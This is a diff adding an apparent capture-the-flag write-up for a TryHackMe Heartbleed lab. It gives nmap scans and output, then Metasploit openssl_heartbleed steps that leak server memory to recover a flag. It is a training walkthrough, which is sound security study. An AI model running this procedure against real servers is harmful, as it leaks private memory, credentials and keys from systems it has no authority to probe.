@@ -1,0 +1,180 @@
+						⠀⠀⠀⠀⣀⣠⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣄⣀⡀⠀⠀⠀
+						⠀⠀⣰⡿⠋⢉⣻⣿⣻⢿⣶⣄⠀⠀⠀⢀⣴⣿⣟⣯⡿⣽⣻⣽⣆⠀⠀
+						⠀⢸⣿⡇⢠⣼⡿⣧⢿⣟⣧⣿⢿⡀⣠⣿⡿⣧⣟⣧⣿⢿⣻⢧⣿⣇⠀
+						⢠⣿⢯⣇⣾⢿⣽⣻⣯⣟⣷⢯⣿⣻⢿⣽⣻⢷⣻⣽⡾⣟⣯⣿⣳⣿⡄
+						⠸⣟⣿⣻⣽⣯⡷⣟⣷⣻⡾⣟⣷⢿⣯⡷⣿⣻⢯⣷⣟⡿⣽⣞⡿⣞⡇
+						⠀⢿⣳⣯⣷⢯⣟⡿⣽⣳⡿⣯⣟⡿⣾⣽⢷⣿⣻⢷⣯⢿⣻⡾⣟⡿⠀
+						⠀⠈⢿⣳⣯⡿⣯⣟⡿⣽⣻⢷⣻⣽⡷⣯⣿⣞⣯⣿⢾⣟⣯⣟⡿⠇⠀
+						⠀⠀⠈⠻⣳⡿⣽⢯⣟⡿⣽⣻⣯⢷⣟⡿⣾⣽⣳⣯⣿⢾⣻⠞⡿⠀⠀
+						⠀⠀⠀⠀⢸⣿⣹⡿⣏⣿⢿⣷⢿⣏⣿⣹⣷⣏⡿⣾⣹⡿⠁⠀⡇⠀⠀
+						⠀⠀⠀⠀⢀⡁⠘⠻⣽⣯⢿⣾⣻⣽⡾⣯⡷⣟⣿⡽⠋⠀⠀⠀⡇⠀⠀
+						⠀⠀⠀⠀⠸⠇⠀⠀⠈⠻⣟⣾⣽⣳⡿⣷⣟⠿⠁⠀⠀⠀⠀⢰⡇⠀⠀
+						⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣞⣯⣿⣳⠋⠀⠀⠀⠀⠀⢀⣾⡇⠀⠀
+						⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣻⢾⠁⠀⠀⠀⠀⠀⠀⣾⣿⠀⠀⠀
+						⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⣎⠹⡇⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀
+						⠀⠀⠀⠀⠀⠀⠀⣼⡄⠀⠀⠀⠉⠀⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+						⠀⠀⠀⠀⠀⠀⠠⣿⠇⠀⠀⠀⠀⢀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+						⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+			██╗  ██╗███████╗ █████╗ ██████╗ ████████╗██████╗ ██╗     ███████╗███████╗██████╗ 
+			██║  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     ██╔════╝██╔════╝██╔══██╗
+			███████║█████╗  ███████║██████╔╝   ██║   ██████╔╝██║     █████╗  █████╗  ██║  ██║
+			██╔══██║██╔══╝  ██╔══██║██╔══██╗   ██║   ██╔══██╗██║     ██╔══╝  ██╔══╝  ██║  ██║
+			██║  ██║███████╗██║  ██║██║  ██║   ██║   ██████╔╝███████╗███████╗███████╗██████╔╝
+			╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═════╝ 
+		       SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?                                                         
+
+https://tryhackme.com/room/heartbleed
+
+--[Basic Enumeration]--
+
+"In this task, you need to obtain a flag using a very well known vulnerability. 
+Make sure you pay attention to all the information and errors displayed. Pay 
+particular attention to how web servers are configured.".
+
+This box teaches you from start to end everything you need to know about heartbleed
+and how to exploit it. Surprisingly easy!
+
+Shodan shows 229,419 hosts are still vulnerable to this vulnerability as of Tuesday, 2 August 2022.
+Heartbleed was first publicly announced in 2014.
+
+Shodan search results show:
+Search query:			vuln:CVE-2014-0160
+Total number of results:	229419
+
+Immediately upon visiting the ip address in our browser we get a security warning in FireFox:
+
+"Warning: Potential Security Risk Ahead
+
+Firefox detected a potential security threat and did not continue to 34.245.36.237. 
+If you visit this site, attackers could try to steal information like your passwords, 
+emails, or credit card details.".
+
+From the room we can make a pretty good assumption that this box is vulnerable to heartbleed
+so my first thought on exploiting this vulnerability is to use metasploit as rapid7 have made
+it incredibly easy to exploit heartbleed. But first lets do some basic recon on the box to verify
+our claims that this box is vulnerable to heartbleed otherwise known as CVE-2014-0160.
+
+--[nmap]--
+
+We are going to do two main scans with nmap, the first scan is just looking at what ports are open,
+what services and version numbers are running on those ports and the second scan will be specific
+to heartbleed to just verify if it is or if it isn't vulnerable to heartbleed (CVE-2014-0160).
+
+Nmap #1: nmap -sC -sV -A 34.245.36.237
+
+22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 be:63:36:d0:97:3e:f0:d2:7b:79:6b:51:b3:c0:ca:71 (RSA)
+|   256 4c:0f:52:a8:49:36:78:92:04:b8:2c:c2:eb:82:dc:71 (ECDSA)
+|_  256 06:29:34:ba:dd:61:f7:44:0b:f8:9d:ee:e3:d1:26:c2 (ED25519)
+111/tcp open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          37644/udp6  status
+|   100024  1          38790/udp   status
+|   100024  1          53213/tcp   status
+|_  100024  1          53743/tcp6  status
+443/tcp open  ssl/http nginx 1.15.7
+|_http-server-header: nginx/1.15.7
+| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
+| Not valid before: 2019-02-16T10:41:14
+|_Not valid after:  2020-02-16T10:41:14
+|_http-title: What are you looking for?
+| tls-nextprotoneg: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+
+Nmap #2: nmap --script ssl-heartbleed -p 443 34.245.36.237
+
+PORT    STATE SERVICE
+443/tcp open  https
+| ssl-heartbleed: 
+|   VULNERABLE: <----
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|       http://cvedetails.com/cve/2014-0160/
+|_      http://www.openssl.org/news/secadv_20140407.txt
+
+And as we can see from the nmap nse heartbleed output that the box is indeed vulnerable to heartbleed.
+
+So now lets move onto exploiting this box! A really good way of exploiting this bug is by using metasploit.
+If we go to rapid7 website we can learn a bit more about the msf heartbleed module [1].
+
+[1] https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed/
+
+In kali linux type 'msfconsole' and then do the following:
+
+msf6 > search heartbleed
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  -----------
+   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
+   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed
+
+We want number 1 so type: 'use 1' and we should have the following output:
+
+msf6 > use 1
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) > 
+
+Now type 'show options'.
+
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options
+
+Module options (auxiliary/scanner/ssl/openssl_heartbleed):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   DUMPFILTER                         no        Pattern to filter leaked memory before storing
+   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
+   MAX_KEYTRIES      50               yes       Max tries to dump key
+   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
+   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT             443              yes       The target port (TCP)
+   STATUS_EVERY      5                yes       How many retries until key dump status
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
+   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   SCAN  Check hosts for vulnerability
+
+
+Now from the 'show options' we can see that really all we need to do is set our RHOSTS and fire off metasploit. 
+However this isn't going to help because we wont see any output and thus cant retrieve the flag. 
+You will see the following output:
+
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
+
+[+] 34.245.36.237:443     - Heartbeat response with leak, 43015 bytes
+[*] 34.245.36.237:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+Not exactly helpful and not what we want. So make sure to set verbose to true.
+
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
+
+And now when we try again we see a lot more information and if you anaylyze the dump carefully you will retrieve the flag.
+
+There you have it super easy, super simple and yet still 229,419 hosts are vulnerable to heartbleed as of Tuesday, 2 August 2022.
+
+=Adam
